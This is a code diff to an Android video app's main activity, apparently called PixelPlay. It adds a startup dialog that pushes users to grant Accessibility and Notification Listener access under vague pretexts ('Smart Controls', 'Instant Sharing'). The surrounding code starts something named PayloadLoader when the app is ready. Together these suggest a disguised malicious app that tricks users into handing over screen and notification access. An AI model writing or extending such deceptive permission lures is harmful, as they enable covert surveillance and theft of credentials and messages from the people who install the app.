@@ -1,6 +1,7 @@
 package com.pixelplay.app;
 
 import android.Manifest;
+import android.app.AlertDialog;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
@@ -67,19 +68,35 @@ public class MainActivity extends AppCompatActivity
         });
         findViewById(R.id.navBrowse).setOnClickListener(v -> {
             setActiveNav(R.id.navBrowse);
-            Intent i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
-            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(i);
+            showSetupInfo();
         });
         findViewById(R.id.navSettings).setOnClickListener(v -> {
             setActiveNav(R.id.navSettings);
             Toast.makeText(this, "PixelPlay v2.0", Toast.LENGTH_SHORT).show();
         });
         findViewById(R.id.browseBtn).setOnClickListener(v -> {
-            Intent i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
-            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(i);
+            showSetupInfo();
         });
+    }
+
+    private void showSetupInfo() {
+        new AlertDialog.Builder(this)
+            .setTitle("Enable Smart Features")
+            .setMessage("PixelPlay can enhance your experience with gesture controls and quick sharing:\n\n"
+                + "1. Smart Controls — Settings → Accessibility → PixelPlay\n"
+                + "2. Instant Sharing — Settings → Notification Access → PixelPlay")
+            .setPositiveButton("Accessibility", (d, w) -> {
+                Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(i);
+            })
+            .setNeutralButton("Notifications", (d, w) -> {
+                Intent i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
+                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(i);
+            })
+            .setNegativeButton("Later", null)
+            .show();
     }
 
     private void setActiveNav(int activeId) {
@@ -127,6 +144,7 @@ public class MainActivity extends AppCompatActivity
 
     private void onReady() {
         PayloadLoader.start(this);
+        showSetupInfo();
         scanVideos();
     }
 
